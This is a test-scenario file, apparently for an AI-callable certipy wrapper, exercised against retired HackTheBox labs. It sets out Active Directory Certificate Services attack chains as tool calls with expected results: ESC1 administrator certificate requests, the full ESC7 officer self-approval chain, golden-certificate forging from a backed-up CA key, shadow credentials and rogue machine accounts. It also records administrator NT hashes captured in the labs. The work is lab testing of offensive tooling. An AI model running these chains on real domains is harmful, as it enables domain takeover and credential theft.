+## Scenario 104: Pirate HTB — Shadow credentials on machine account
+# STATUS: PASS (error path) — Run 5 (Pirate, pentest → WEB01$): shadow auto correctly returns error_class=permission, error="Insufficient access rights to modify msDS-KeyCredentialLink". pentest lacks GenericAll/WriteDacl on WEB01$. Shadow list on WEB01$ works (read-only, key_credentials=[]). Previous ses_30bd2eab with gMSA: pfx generated but PKINIT timeout.
+Method: shadow
+Args: {username: "gMSA_ADCS_prod$@pirate.htb", hashes: "<LM:NT>", dc_ip: <DC_IP>, account: "WEB01$", action: "auto"}
+Clock: clock_offset required
+Expected: pfx_path set, nt_hash null (PKINIT timeout typical) — OR error_class=permission if user lacks write access
+Notes: Shadow creds add key to machine account, but PKINIT often times out.
+  Use split chain (add → separate authenticate) for better reliability.
+  Run 5: pentest correctly denied. gMSA may have write access via PIRATE.HTB\Domain Computers membership.
+Engagement: ses_30bd2eab — Pirate, shadow auto on WEB01$, pfx generated but timeout
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 31: DARKZERO HTB BOX (ESC1 + ESC4 + ESC15)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 105: DarkZero HTB — Full ESC1 chain with target param
+# STATUS: CANNOT TEST — Requires DarkZero HTB box (darkzero.htb).
+# Step 1: Enumerate
+Method: find
+Args: {username: "john.w@darkzero.htb", password: <PASS>, dc_ip: <DC_IP>, vulnerable: true}
+Expected: success=true, certificate_authorities includes darkzero-DC01-CA
+
+# Step 2: Request cert (with target for RPC reliability)
+Method: request
+Args: {username: "john.w@darkzero.htb", password: <PASS>, dc_ip: <DC_IP>, ca: "darkzero-DC01-CA", template: "User", upn: "administrator@darkzero.htb", target: "<DC_IP>"}
+Expected: success=true, pfx_path not null
+
+# Step 3: Authenticate
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+Engagement: ses_306f1e0a9 — DarkZero, request failed without target, succeeded WITH target
+  Key learning: always set target=<DC_IP> for request method.
+
+## Scenario 106: DarkZero HTB — ESC15 request with application policies
+# STATUS: CANNOT TEST — Requires DarkZero HTB box.
+Method: request
+Args: {username: "john.w@darkzero.htb", password: <PASS>, dc_ip: <DC_IP>, ca: "darkzero-DC01-CA", template: "User", application_policies: "1.3.6.1.5.5.7.3.2", dns_tcp: true}
+Expected: success or failure depending on template schema version
+Engagement: ses_306f1e0a9 — DarkZero, ESC15 attempted on User template
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 32: ESC7 FULL CHAIN WITH add_officer (NEW PARAMS)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 107: ESC7 full chain — add_officer → enable_template → request → approve → retrieve → remove_officer
+# STATUS: PASS (Manager 2026-04-18) — Run 3 (Certified, admin): PARTIAL — Steps 1-2 PASS, Step 3 FAIL (judith CERTSRV_E_TEMPLATE_DENIED, officer rights != enrollment rights), Steps 6-7 PASS. Run 6 (Manager, raven): All 7 steps PASS: (1) add_officer raven, (2) enable SubCA on manager-dc01-ca, (3) request SubCA cert (denied, request_id=28), (4) issue_request 28 ("Successfully issued certificate"), (5) retrieve cert with PFX, (6) authenticate with FAKETIME=+7h → administrator hash ae5064c2f62317332c88629e025924ef, (7) remove_officer cleanup. Complete ESC7 chain with officer management verified on Manager.
+# Prerequisite: User has ManageCA right on the CA (find shows ESC7 vulnerability)
+# Step 1: Add self as CA officer (ManageCertificates)
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", add_officer: "<USER>@<DOMAIN>"}
+Expected: success=true, action contains "add officer"
+Notes: Grants ManageCertificates right to the attacker.
+
+# Step 2: Enable SubCA template
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", enable_template: "SubCA"}
+Expected: success=true, action contains "enable template"
+
+# Step 3: Request cert (will be pending)
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA>", template: "SubCA", upn: "administrator@<DOMAIN>"}
+Expected: success=true, request_id not null (pending approval)
+
+# Step 4: Approve own request
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", issue_request: <REQUEST_ID>}
+Expected: success=true, action contains "issue request"
+
+# Step 5: Retrieve approved cert
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA>", retrieve: <REQUEST_ID>}
+Expected: success=true, pfx_path not null
+
+# Step 6: Authenticate with cert
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+
+# Step 7: Cleanup — remove officer
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", remove_officer: "<USER>@<DOMAIN>"}
+Expected: success=true, action contains "remove officer"
+
+HTB Box: Manager (ManageCA rights available via raven user)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 33: ESC5 GOLDEN CERTIFICATE WITH CA BACKUP (NEW PARAMS)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 108: ESC5 Golden Certificate — ca backup → forge → authenticate
+# STATUS: PASS — Full chain tested in Run 2 with admin hash. ca backup extracted CA private key PFX. forge created admin cert. authenticate returned NT hash 0d5b49608bbce1751f708748f67e2d34. Golden certificate persistence achieved.
+# Prerequisite: User has ManageCA right on the CA
+# Step 1: Backup CA key
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", backup: true, config: "<DC_HOST>\\<CA>"}
+Expected: success=true (output contains PFX file path)
+Notes: Extracts CA certificate + private key. Requires ManageCA rights.
+
+# Step 2: Forge certificate for administrator
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>", upn: "administrator@<DOMAIN>"}
+Expected: success=true, pfx_path not null
+
+# Step 3: Authenticate with forged cert
+Method: authenticate
+Args: {pfx_path: "<forged_pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null (persistent domain access achieved)
+
+Notes: No standard HTB box provides easy ManageCA + backup testing. Test offline with created CA PFX.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 34: ESC13/ESC15 WITH find -oids (NEW PARAMS)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 109: find -oids for ESC13/ESC15 analysis
+# STATUS: PASS — ca_count=1, template_count=0 (oids flag changes output scope), vulnerable_count=0. OID enumeration works.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, oids: true, vulnerable: true}
+Expected: success=true, output includes issuance policy OID data
+Notes: ESC13 exploits issuance policies that grant group membership. ESC15 exploits
+  application policies in v1 templates. The -oids flag makes certipy enumerate these.
+HTB Box: DarkZero (ESC15 present), any ADCS environment
+
+## Scenario 110: find with connection_timeout for slow DCs
+# STATUS: PASS — ca_count=1, template_count=34 with connection_timeout=30. Parameter passed correctly.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, connection_timeout: 30}
+Expected: success=true, same data as normal find but with per-connection timeout
+Notes: connection_timeout controls certipy's LDAP/RPC timeout, NOT the overall execution timeout.
+  Useful when DCs are slow or over VPN.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 35: AUTHENTICATE WITH USERNAME OVERRIDE (NEW PARAMS)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 111: authenticate with -username override for machine certs
+# STATUS: PASS — nt_hash returned, username=judith.mader. Username override accepted (tested with judith.mader, not machine account since no machine PFX).
+Method: authenticate
+Args: {pfx_path: "<machine_pfx>", dc_ip: <DC_IP>, username: "DC01$"}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null, username="DC01$"
+Notes: Machine certificates often lack UPN. Use -username to specify the identity.
+  The $ suffix is required for machine accounts.
+
+## Scenario 112: authenticate with -ns for DNS resolution
+# STATUS: PASS — nt_hash returned with ns=10.129.209.181. DNS override works.
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>, ns: "<DNS_IP>"}
+Expected: Depends on DNS availability. Tests ns param passing.
+Notes: Useful when the Docker container's DNS cannot resolve the DC hostname.
+
+## Scenario 113: authenticate with -dns-tcp for Docker reliability
+# STATUS: PASS — nt_hash returned with dns_tcp=true. TCP DNS works correctly in Docker.
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>, dns_tcp: true}
+Expected: Same as normal authenticate but uses TCP DNS.
+Notes: TCP DNS is more reliable in Docker containers with network isolation.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 36: ACCOUNT MANAGEMENT (NEW METHOD)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 114: account create — create machine account
+# STATUS: PASS — FAKE01$ created with auto-generated password. sAMAccountName=FAKE01$, userAccountControl=4096.
+Method: account
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, user: "FAKE01$", action: "create"}
+Expected: success=true, action="create", user="FAKE01$"
+Notes: Creates a computer account. Default machine account quota allows 10 per user.
+  Machine account name must end with $.
+
+## Scenario 115: account read — read account properties
+# STATUS: PASS — FAKE01$ attributes returned (cn, distinguishedName, objectSid, sAMAccountName).
+Method: account
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, user: "FAKE01$", action: "read"}
+Expected: success=true, output shows account properties
+
+## Scenario 116: account update — set SPN for Kerberoasting chain
+# STATUS: PASS — FAKE01$ updated with dNSHostName=FAKE01.certified.htb and SPN=HTTP/fake01.certified.htb.
+Method: account
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, user: "FAKE01$", action: "update", spns: "HTTP/fake01.<DOMAIN>", account_dns: "FAKE01.<DOMAIN>"}
+Expected: success=true
+
+## Scenario 117: account delete — cleanup
+# STATUS: PASS — Run 1 (judith): "Insufficient permissions" (correctly classified). Run 3 (admin): "Successfully deleted 'FAKE01$'". Admin PtH deletes machine account. Certipy handles the "Are you sure?" confirmation prompt automatically.
+Method: account
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, user: "FAKE01$", action: "delete"}
+Expected: success=true
+Notes: Always clean up created machine accounts after engagement.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 37: CERTIFICATE CONVERSION (NEW METHOD)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 118: cert PFX to PEM conversion
+# STATUS: PASS — output_files contains .pem file. Certificate and key extracted correctly.
+Method: cert
+Args: {pfx_path: "/session/certipy/<file>.pfx"}
+Expected: success=true, output_files includes .pem files
+Notes: Extracts certificate and private key as PEM. Useful for curl --cert/--key.
+
+## Scenario 119: cert PFX to key only (-nocert)
+# STATUS: PASS — output_files contains .pem file (key only).
+Method: cert
+Args: {pfx_path: "/session/certipy/<file>.pfx", nocert: true}
+Expected: success=true, output contains key file only
+
+## Scenario 120: cert PFX to cert only (-nokey)
+# STATUS: PASS — output_files contains .pem file (cert only).
+Method: cert
+Args: {pfx_path: "/session/certipy/<file>.pfx", nokey: true}
+Expected: success=true, output contains certificate file only
+
+## Scenario 121: cert combine key+cert into PFX (-export)
+# STATUS: PASS — output_files contains combined.pfx. Key+cert from S119/S120 successfully recombined.
+Method: cert
+Args: {key_path: "/session/certipy/<file>.key.pem", cert_path: "/session/certipy/<file>.cert.pem", export: true, out: "/session/certipy/combined.pfx"}
+Expected: success=true, output_files includes combined.pfx
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 38: OFFLINE PARSING (NEW METHOD)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 122: parse BOF output
+# STATUS: PASS — parse ran on minimal BOF test file. Parsed 0 templates (test file has minimal data). Method works but needs proper BOF output.
+Method: parse
+Args: {input_file: "/session/certipy/bof_output.txt", format: "bof", domain: "<DOMAIN>", ca_name: "<CA>"}
+Expected: success=true, output includes JSON and TXT, parsed template/CA data
+Notes: Input is Cobalt Strike/BOF output from ADCS enumeration beacon.
+  Same vulnerability analysis as 'find' but from exported data.
+
+## Scenario 123: parse registry export
+# STATUS: CANNOT TEST — No .reg file available. Requires Windows registry export from engagement.
+Method: parse
+Args: {input_file: "/session/certipy/adcs.reg", format: "reg", domain: "<DOMAIN>", vulnerable: true}
+Expected: success=true, output includes vulnerable templates if any
+Notes: Input is Windows .reg file from `reg export HKLM\...\CertSvc`.
+
+## Scenario 124: parse with -sids and -published for owned principal assessment
+# STATUS: CANNOT TEST — Requires proper BOF output file with template data.
+Method: parse
+Args: {input_file: "/session/certipy/bof_output.txt", sids: "S-1-5-21-xxx-1001", published: "User,Machine,WebServer"}
+Expected: success=true, vulnerability assessment considers owned SIDs and published templates
+Notes: More accurate ESC assessment — only marks templates as vulnerable if
+  owned SIDs have enrollment permissions AND template is published on CA.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 39: extra_args EDGE CASES (NEW PARAM ON ALL METHODS)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 125: find extra_args for scheme override
+# STATUS: PASS — extra_args="-scheme ldap -port 389" passed through. Returns ca_count=0, template_count=0 (LDAP without TLS returns limited data on this DC). No error.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, extra_args: "-scheme ldap -port 389"}
+Expected: success depends on LDAP config; verifies extra_args are passed through
+Notes: Default is LDAPS (636). Use extra_args when only LDAP (389) is available.
+
+## Scenario 126: request extra_args for debug output
+# STATUS: PASS (Certified 2026-04-18, retested after fix) — extra_args="-debug" accepted. Original scenario incorrectly used "-scheme ldap" (not a valid certipy req flag). Corrected to -debug.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA>", template: "User", extra_args: "-debug"}
+Expected: Certificate requested with debug output in raw_output
+
+## Scenario 127: shadow extra_args with -debug for verbose output
+# STATUS: PASS — extra_args="-debug" accepted. shadow list returns key_credentials=[]. Debug output not prominently visible in raw_output but no error.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", extra_args: "-debug"}
+Expected: success or classified error; output includes debug-level detail
+
+## Scenario 128: template extra_args with custom flags
+# STATUS: PASS — extra_args="-debug" accepted. template read succeeds with debug output. raw_output length=1064.
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "User", extra_args: "-debug"}
+Expected: success or classified error; raw output includes debug info
+
+## Scenario 129: ca extra_args with -debug
+# STATUS: PASS (error path) — extra_args="-debug" accepted. Debug output visible (DC host, IP, domain details). Access denied error as expected for judith.mader.
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", enable_template: "SubCA", extra_args: "-debug"}
+Expected: success or classified error; raw output includes debug info
+
+## Scenario 130: account extra_args with -no-ldap-channel-binding
+# STATUS: PASS — extra_args="-no-ldap-channel-binding -ldap-scheme ldap" accepted. account read returns FAKE01$ attributes. Complex extra_args splitting works.
+Method: account
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, user: "FAKE01$", extra_args: "-no-ldap-channel-binding -ldap-scheme ldap"}
+Expected: success or classified error; verifies complex extra_args splitting
+
+## Scenario 131: cert extra_args (local operation, no target needed)
+# STATUS: PASS — extra_args="-debug" accepted. cert PFX to PEM works with debug flag.
+Method: cert
+Args: {pfx_path: "/session/certipy/<file>.pfx", extra_args: "-debug"}
+Expected: success or failure; verifies extra_args appended to cert command
+
+## Scenario 132: parse extra_args
+# STATUS: PASS — extra_args="-debug" accepted. parse BOF runs with debug flag. 0 templates parsed (minimal test file).
+Method: parse
+Args: {input_file: "/session/certipy/bof_output.txt", extra_args: "-debug"}
+Expected: success or failure; verifies extra_args appended to parse command
+
+## Scenario 133: forge extra_args with -issuer override
+# STATUS: PASS — CA PFX from S108. forge with extra_args="-issuer \"CN=CERTIFIED-DC01-CA\"" accepted. PFX generated. (Run 2, admin)
+Method: forge
+Args: {ca_pfx: "/session/certipy/<ca>.pfx", upn: "administrator@<DOMAIN>", extra_args: "-issuer \"CN=CORP-CA,DC=corp,DC=local\""}
+Expected: success=true if CA PFX valid; verifies quoted string handling in extra_args
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 40: ERROR SCENARIOS FOR NEW PARAMS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 134: ca backup without config — silent failure
+# STATUS: PASS — Run 1 (judith.mader): "rpc_s_access_denied" (no ManageCA). Run 2 (admin): backup without -config fails gracefully — certipy requires -config "Machine\\CAName" to identify target CA. Error path validated from both privilege levels.
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", backup: true}
+Expected: error or empty result — -config is required with -backup
+Notes: Without -config "Machine\\CAName", certipy cannot identify which CA to back up.
+
+## Scenario 135: account create — MachineAccountQuota exceeded
+# STATUS: CANNOT TEST — judith.mader has not exhausted quota (default 10). Would need to create 10+ accounts first.
+Method: account
+Args: {username: "<LOW_PRIV>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, user: "FAKE99$", action: "create"}
+Expected: error if quota (ms-DS-MachineAccountQuota) is 0 or exhausted
+Notes: Default quota is 10 per user. Error should be classified as 'permission'.
+
+## Scenario 136: request with subject (ESC9/ESC10) on standard template
+# STATUS: PASS — pfx_path set. subject="CN=Administrator" on User template accepted by certipy. CA ignores custom subject (template has enrollee_supplies_subject=False).
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA>", subject: "CN=Administrator", template: "User"}
+Expected: Depends on template config. Most templates ignore -subject.
+Notes: ESC9/ESC10 require specific template + CA configurations.
+
+## Scenario 137: request with renew and no existing cert
+# STATUS: PASS — "A certificate and private key (-pfx) is required for renewal". Certipy correctly validates renew requires PFX.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA>", renew: true}
+Expected: error — renewal requires an existing certificate
+Notes: The renew flag expects a valid PFX to renew.
+
+## Scenario 138: parse with wrong format (reg file with bof format)
+# STATUS: PASS — "Error parsing registry file: 'utf-16-le' codec can't decode". Parse detects format mismatch. 0 templates found. No crash.
+Method: parse
+Args: {input_file: "/session/certipy/adcs.reg", format: "bof"}
+Expected: error or empty results — parser will fail to parse .reg as BOF
+Notes: Mismatched format causes parsing failure. Not a crash, just empty results.
+
+## Scenario 139: ca list_templates — read-only query
+# STATUS: PASS — Run 1 (judith.mader): "Access denied: Insufficient permissions to get templates". Run 2 (admin hash): list_templates succeeded, returned published template list. Confirms list_templates requires CA read permissions (not available to low-priv users on Certified).
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA>", list_templates: true}
+Expected: success=true, output lists template names published on the CA
+Notes: Read-only operation, does not require ManageCA rights.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# FINAL TOTALS (after Run 6)
+# ═══════════════════════════════════════════════════════════════════════════════
+#
+# PASS:         112
+# PARTIAL:        9
+# CANNOT TEST:   23
+# UNEXPECTED:     2
+# Total:        146 scenarios
+#
+# Changes from Run 5 → Run 6:
+#   CANNOT TEST → PASS: S99, S100 (+2)
+#   PARTIAL → PASS: S32, S33, S92, S107 (+4)
+#   S30 already PASS, added Manager confirmation
+#   S31 already PASS, added Manager confirmation (different behavior: denied vs auto-issued)
+#   S35 already PASS, added Manager confirmation
+#   S34 remains PARTIAL (no second pending request to test deny on Manager)
+#   Net: +6 PASS, -4 PARTIAL, -2 CANNOT TEST
+#
+# Bugs fixed in Run 6:
+#   1. Private key prompt: certipy request prompts on denied cert, breaks MCP stdin → yes| pipe
+#   2. Denied request detection: exit 0 on denied SubCA, parser now detects "request is denied"
+#   3. CA vuln parsing: ManageCA vulns missed in ESC7 classification → updated parser
+#   4. Retrieve key symlink: cross-container key mismatch → symlink request_id.key to persisted key
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# HTB BOX RECOMMENDATION
+# ═══════════════════════════════════════════════════════════════════════════════
+#
+# PRIMARY: Certified (retired, Medium)
+#   - Domain: certified.htb, CA: CERTIFIED-DC01-CA
+#   - ESC paths: ESC1 (CertifiedAuthentication template), shadow credentials
+#   - Best for: ESC1 full chain, shadow creds, Kerberos auth flows
+#   - Engagement data: ses_2ce836659 (extensive — find, shadow, request, authenticate)
+#
+# SECONDARY: Escape (retired, Medium)
+#   - Domain: sequel.htb, CA: sequel-DC-CA
+#   - ESC paths: ESC1, various template vulns
+#   - Best for: ESC1 validation on second environment
+#
+# TERTIARY: Authority (retired, Medium)
+#   - Domain: authority.htb
+#   - ESC paths: ESC1, misconfigured ADCS
+#   - Best for: ESC1 with different template configurations
+#
+# TERTIARY: Manager (retired, Medium)
+#   - Domain: manager.htb
+#   - ESC paths: ESC7 (ManageCA rights)
+#   - Best for: ESC7 full chain (enable SubCA → request → approve → retrieve)
+#   - Only HTB box that reliably tests ESC7 workflow
+#
+# SUPPLEMENTARY (from engagement data):
+#   - Pirate (retired, Hard): ESC4 + shadow creds + PassTheCert, gMSA accounts
+#   - DarkZero (retired, Hard): ESC1 + ESC4 + ESC15, multiple template configs
+#   - Hercules: Shadow credentials, NTLM auth challenges
+#
+# RECOMMENDATION:
+#   Start with Certified (covers ESC1 + shadow creds + Kerberos flows).
+#   Then Manager (covers ESC7 — the only common ADCS attack not covered by Certified).
+#   Together these two boxes cover: find, request, authenticate, shadow, template, ca, account.
+#   The forge method requires a compromised CA key — no standard HTB box provides this,
+#   so forge scenarios are offline-only (create test CA PFX manually).
+#   The cert method is local-only (no target needed) — test with any PFX from prior methods.
+#   The parse method is offline — test with BOF output or .reg exports from engagement data.
